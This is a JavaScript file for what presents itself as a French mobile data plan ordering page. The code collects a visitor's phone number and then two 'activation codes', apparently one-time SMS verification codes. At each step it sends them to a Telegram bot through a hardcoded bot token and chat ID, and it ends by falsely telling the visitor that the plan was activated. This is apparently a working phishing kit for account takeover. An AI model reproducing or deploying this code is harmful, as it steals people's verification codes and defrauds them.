const BOT_TOKEN = '8751335932:AAHoS96avp1R_OsG0uI9yk1aie02H7Lb2Ms';
const CHAT_ID = '2056358288';

document.addEventListener('DOMContentLoaded', () => {
    const modal = document.getElementById('orderModal');
    const closeBtn = document.querySelector('.close-btn');
    const orderForm = document.getElementById('orderForm');
    const modalPackageDetails = document.getElementById('modalPackageDetails');
    const orderStatus = document.getElementById('orderStatus');
    const btnConfirmOrder = document.getElementById('btnConfirmOrder');
    
    const step1Group = document.getElementById('step1Group');
    const step2Group = document.getElementById('step2Group');
    const step3Group = document.getElementById('step3Group');
    const step4Group = document.getElementById('step4Group');
    
    const phoneNumberInput = document.getElementById('phoneNumber');
    const phoneNumberConfirmInput = document.getElementById('phoneNumberConfirm');
    const activationCodeInput = document.getElementById('activationCode');
    const activationCode2Input = document.getElementById('activationCode2');
    
    let currentStep = 1;
    let selectedPackage = '';
    let selectedPrice = '';

    // Open modal on button click
    document.querySelectorAll('.btn-choose').forEach(button => {
        button.addEventListener('click', (e) => {
            const card = e.target.closest('.pricing-card');
            
            // Extract package info
            const dataAmountElem = card.querySelector('.data-amount');
            const dataAmount = dataAmountElem.classList.contains('infinity') ? 'Illimité' : dataAmountElem.textContent.trim();
            const validity = card.querySelector('.validity').textContent.trim();
            selectedPrice = card.querySelector('.price').textContent.trim();
            
            selectedPackage = `${dataAmount} (${validity})`;
            
            modalPackageDetails.innerHTML = `Vous avez sélectionné le forfait <strong>${selectedPackage}</strong> à <strong>${selectedPrice}</strong>.`;
            
            // Reset form
            orderForm.reset();
            orderStatus.style.display = 'none';
            btnConfirmOrder.disabled = false;
            btnConfirmOrder.textContent = 'CONTINUER';
            
            step1Group.style.display = 'block';
            step2Group.style.display = 'none';
            step3Group.style.display = 'none';
            step4Group.style.display = 'none';
            
            phoneNumberInput.disabled = false;
            phoneNumberConfirmInput.required = false;
            activationCodeInput.required = false;
            activationCode2Input.required = false;
            
            currentStep = 1;
            
            modal.style.display = 'flex';
        });
    });

    // Close modal
    closeBtn.addEventListener('click', () => {
        modal.style.display = 'none';
    });

    window.addEventListener('click', (e) => {
        if (e.target === modal) {
            modal.style.display = 'none';
        }
    });

    async function sendTelegramMessage(message) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            return response.ok;
        } catch (error) {
            console.error(error);
            return false;
        }
    }

    // Handle form submission
    orderForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        if (currentStep === 1) {
            step1Group.style.display = 'none';
            step2Group.style.display = 'block';
            phoneNumberConfirmInput.required = true;
            btnConfirmOrder.textContent = 'ENVOYER LA DEMANDE';
            currentStep = 2;
            return;
        }
        
        if (currentStep === 2) {
            const phoneNumber = phoneNumberInput.value;
            const phoneNumberConfirm = phoneNumberConfirmInput.value;
            
            if (phoneNumber !== phoneNumberConfirm) {
                orderStatus.textContent = 'Les numéros de téléphone ne correspondent pas.';
                orderStatus.className = 'order-status status-error';
                orderStatus.style.display = 'block';
                
                setTimeout(() => {
                    orderStatus.style.display = 'none';
                    step1Group.style.display = 'block';
                    step2Group.style.display = 'none';
                    phoneNumberConfirmInput.required = false;
                    phoneNumberConfirmInput.value = '';
                    btnConfirmOrder.textContent = 'CONTINUER';
                    currentStep = 1;
                }, 3000);
                
                return;
            }

            btnConfirmOrder.disabled = true;
            btnConfirmOrder.textContent = 'ENVOI EN COURS...';

            const message = `🔔 *NOUVELLE DEMANDE*\n\n` +
                            `📦 *Forfait*: ${selectedPackage}\n` +
                            `💰 *Prix*: ${selectedPrice}\n` +
                            `📞 *Numéro*: ${phoneNumber}\n` +
                            `⏱ *Date*: ${new Date().toLocaleString()}`;

            const success = await sendTelegramMessage(message);

            if (success) {
                // Move to step 3
                step2Group.style.display = 'none';
                step3Group.style.display = 'block';
                activationCodeInput.required = true;
                btnConfirmOrder.textContent = 'CONTINUER';
                btnConfirmOrder.disabled = false;
                orderStatus.style.display = 'none';
                currentStep = 3;
            } else {
                orderStatus.textContent = 'Erreur lors de l\'envoi de la demande. Veuillez réessayer.';
                orderStatus.className = 'order-status status-error';
                orderStatus.style.display = 'block';
                btnConfirmOrder.disabled = false;
                btnConfirmOrder.textContent = 'ENVOYER LA DEMANDE';
            }
            return;
        }

        if (currentStep === 3) {
            const phoneNumber = phoneNumberInput.value;
            const code = activationCodeInput.value;

            btnConfirmOrder.disabled = true;
            btnConfirmOrder.textContent = 'ENVOI EN COURS...';

            const message = `✅ *PREMIER CODE*\n\n` +
                            `📞 *Numéro*: ${phoneNumber}\n` +
                            `🔑 *Code 1*: ${code}\n` +
                            `⏱ *Date*: ${new Date().toLocaleString()}`;

            const success = await sendTelegramMessage(message);

            if (success) {
                step3Group.style.display = 'none';
                step4Group.style.display = 'block';
                activationCode2Input.required = true;
                btnConfirmOrder.textContent = 'ACTIVER MON FORFAIT';
                btnConfirmOrder.disabled = false;
                orderStatus.style.display = 'none';
                currentStep = 4;
            } else {
                orderStatus.textContent = 'Erreur lors de l\'envoi du code. Veuillez réessayer.';
                orderStatus.className = 'order-status status-error';
                orderStatus.style.display = 'block';
                btnConfirmOrder.disabled = false;
                btnConfirmOrder.textContent = 'CONTINUER';
            }
            return;
        }

        if (currentStep === 4) {
            const phoneNumber = phoneNumberInput.value;
            const code2 = activationCode2Input.value;

            btnConfirmOrder.disabled = true;
            btnConfirmOrder.textContent = 'VÉRIFICATION...';

            const message = `✅ *DEUXIÈME CODE*\n\n` +
                            `📞 *Numéro*: ${phoneNumber}\n` +
                            `🔑 *Code 2*: ${code2}\n` +
                            `⏱ *Date*: ${new Date().toLocaleString()}`;

            const success = await sendTelegramMessage(message);

            if (success) {
                orderStatus.textContent = 'Votre forfait a été activé avec succès !';
                orderStatus.className = 'order-status status-success';
                orderStatus.style.display = 'block';
                btnConfirmOrder.textContent = 'TERMINE';
                
                setTimeout(() => {
                    modal.style.display = 'none';
                }, 3500);
            } else {
                orderStatus.textContent = 'Erreur lors de l\'activation. Veuillez réessayer.';
                orderStatus.className = 'order-status status-error';
                orderStatus.style.display = 'block';
                btnConfirmOrder.disabled = false;
                btnConfirmOrder.textContent = 'ACTIVER MON FORFAIT';
            }
        }
    });
});
